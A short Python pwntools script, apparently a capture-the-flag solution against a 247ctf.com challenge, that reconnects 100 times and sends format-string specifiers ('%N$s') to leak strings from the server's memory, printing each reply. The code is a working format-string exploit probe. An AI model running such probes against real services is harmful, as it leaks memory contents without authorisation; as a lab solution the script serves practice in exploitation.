#!/usr/bin/env python

from pwn import *

context.log_level = 'critical'

for i in range(100):
	p = remote('88b92067707aca6a.247ctf.com', 50457)
	try:
		p.sendlineafter('again?\n', '%'+str(i)+'$s')
		p.recvuntil('Welcome back ')
		r = p.recvuntil('\n')
		print r
		p.close()
	except:
		p.close()
